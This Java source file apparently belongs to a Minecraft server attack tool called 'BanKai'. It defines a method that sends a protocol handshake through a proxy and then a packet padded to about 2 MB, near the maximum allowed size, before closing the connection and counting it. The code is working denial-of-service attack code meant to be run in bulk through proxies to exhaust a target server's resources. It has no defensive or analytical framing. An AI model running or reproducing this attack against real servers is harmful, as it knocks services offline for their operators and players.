package dev.xdmeow.core.methods.impl;

import java.io.IOException;

import dev.xdmeow.BanKai;
import dev.xdmeow.core.NettyBootstrap;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.util.mcutil.ext.Handshake;
import dev.xdmeow.core.util.proxy.Proxy;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class MaxsizePacket implements IMethod{
    private Handshake handshake;
    private int size = 2097150;
    private byte[] bytes;
    private byte[] arrxd;

    public MaxsizePacket() {
        this.handshake = new Handshake(BanKai.protocol, BanKai.srvRecord, BanKai.port, 2);
        this.bytes = this.handshake.getWrappedPacket();
        this.arrxd = new byte[2097150];
    }

    public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
        while((paramInt & -128) != 0) {
           out.writeByte(paramInt & 127 | 128);
           paramInt >>>= 7;
        }
  
        out.writeByte(paramInt);
     }
     
    @Override
    public void accept(Channel channel, Proxy proxy) {

        channel.write(Unpooled.buffer().writeBytes(this.bytes));

        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream out = new ByteBufOutputStream(b);

        try {
            writeVarInt(out, (size+1));
            out.write(this.arrxd);
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }  
        
        channel.writeAndFlush(b);
        ++NettyBootstrap.currentConnections;
        ++NettyBootstrap.totalConnections;
        channel.close();
    }

}
